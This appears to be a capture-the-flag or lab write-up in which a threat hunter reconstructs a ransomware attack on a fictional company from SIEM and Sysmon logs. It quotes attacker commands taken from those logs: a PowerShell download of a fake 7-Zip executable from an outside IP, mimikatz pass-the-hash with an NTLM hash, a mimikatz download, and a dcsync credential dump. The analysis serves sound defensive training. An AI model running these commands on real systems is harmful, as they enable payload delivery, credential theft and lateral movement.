  $${{\color{Orange}\huge{\textsf{Typo Snare\ }}}}\$$

---
$${{\color{Silver}\huge{\textsf{Background  }}}}\$$

---
The alert hit the SOC around 4:00 PM. Two machines, fully encrypted. Ransom notes where files used to be. The central SIEM went dark just minutes before.

Fortunately, someone had managed to pull logs from the two affected hosts—Perry’s and another developer’s—before everything spiraled out of control.

Now the team has to figure out what happened. And all signs point to something Perry did earlier that day...

September 26, 2023 — just another Tuesday at SwiftSpend Financial, a small but resourceful company where everyone’s always juggling five deadlines and too much coffee.

Perry, one of the devs, had a tight sprint deadline. His manager had sent him an encrypted .7z archive with a snippet of code that needed finishing yesterday. Perry quickly realized his workstation didn’t have anything that could unzip the file. So, in true caffeine-fueled developer fashion, he Googled the first thing that came to mind, clicked the top result (because who scrolls down?), and downloaded a tool to open it.

Everything seemed fine. Until it wasn’t.

A little more than one hour later, Perry’s workstation started acting weird. At first, it was slow. Then apps crashed. Then everything—literally every file—became unreadable.

Your mission as a threat hunter is to dig through the logs and reconstruct the attack chain. What happened? How did it start? How did it spread? And what damage did it do?



## STARTING POINT 


<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/d49f8bd8-2f95-4291-94bc-86ecab43a0da" />

Examining Perry Parson ip address of 172.16.1.152 -> WKSTN-03 and changing the date to investigate the incidnet occurence of Sept 26,2023

------------------------------
<br></br>
<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/5caf0416-9f15-4b0d-9c86-b0b3935bb0ed" />

At Sep 26, 2023 @ 14:23:02 was when the process was created downloading the 7zipp


Sep 26, 2023 @ 14:23:23.1
There is exactly one hit showing the suspect Ip address  and the ICO file name of 7zipp.exe
<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/f6b01d2c-7fd7-48d1-b561-a8f60b83ee58" />
```
iwr http://206.189.34.218/a/7zipp.exe -outfile 'C:\Program Files\7-zip\7zipp.exe';

```
------------------------------
<br></br>
Sep 26, 2023 @ 14:23:22.551
The file creationg event for 7zipp.exe wit ha file path of 	C:\Program Files\7-Zip\7zipp.exe
<img width="1259" height="808" alt="image" src="https://github.com/user-attachments/assets/f1dbfb3d-a117-41ca-aceb-5c96e9cc667d" />
-----------------------------
<br></br>
Lateral Tool Transfer 
Sep 26, 2023 @ 14:29:43.458
ProcessId: 6804 Image: C:\Windows\Temp\m\x64\mimikatz.exe 
FileVersion: 2.2.0.0 Description: mimikatz for Windows Product: mimikatz Company: gentilkiwi (Benjamin DELPY) OriginalFileName: mimikatz.exe CommandLine: .\mimikatz.exe 'sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8BD4E00564128E0A5EA2BC4CF /run:powershell.exe' 'exit' CurrentDirectory: C:\Windows\Temp\m\x64\ User: NT AUTHORITY\SYSTEM 
- An attacker is not using a password
- They are using an NTLM hash to impersonate james.cromwell
- They spawn a new process (powershell.exe) under that identity
- User: NT AUTHORITY\SYSTEM
  IntegrityLevel: System
- User: James Cromwell
- 172.16.1.157
------------------------------
Sep 26, 2023 @ 15:34:00.81
Process Create: RuleName: 
- UtcTime: 2023-09-26 15:34:00.817 ProcessGuid: {9e7a9aa0-f9e8-6512-cb04-000000004f02} ProcessId: 4432 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.17763.1 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft® Windows® Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: -C iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile m.zip CurrentDirectory:
- C:\Users\anna.jones\Downloads\ User: SSF\anna.jones 
- User: Anna Jones
- 172.16.1.151

<img width="1703" height="1215" alt="image" src="https://github.com/user-attachments/assets/e2ce67cb-95ad-45ef-857d-472cf868e17a" />
This destination ip 206.189.34.218 is discovered in this image
<br></br>
------------------------------
```
Network connection detected:
RuleName: -
UtcTime: 2023-09-26 14:55:03.628
ProcessGuid: {9e7a9aa0-f0c7-6512-2204-000000004f02}
ProcessId: 5280
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: SSF\anna.jones
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 172.16.1.151
SourceHostname: WKSTN-02.swiftspendfinancial.thm
SourcePort: 50855
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 206.189.34.218
DestinationHostname: -
DestinationPort: 80
DestinationPortName: http

```

<br></br>
------------------------------
Sep 26, 2023 @ 15:34:42.487
Process Create: RuleName:
- UtcTime: 2023-09-26 15:34:42.487 ProcessGuid: {9e7a9aa0-fa12-6512-d104-000000004f02} ProcessId: 7240 Image: C:\Users\anna.jones\Downloads\m\x64\mimikatz.exe FileVersion: 2.2.0.0 Description: mimikatz for Windows Product: mimikatz Company: gentilkiwi (Benjamin DELPY) OriginalFileName: mimikatz.exe
- C:\Users\anna.jones\Downloads\m\x64\mimikatz.exe" "lsadump::dcsync /user:damian.hall"
- User: Damian Hall
- 172.16.1.150

<br></br>

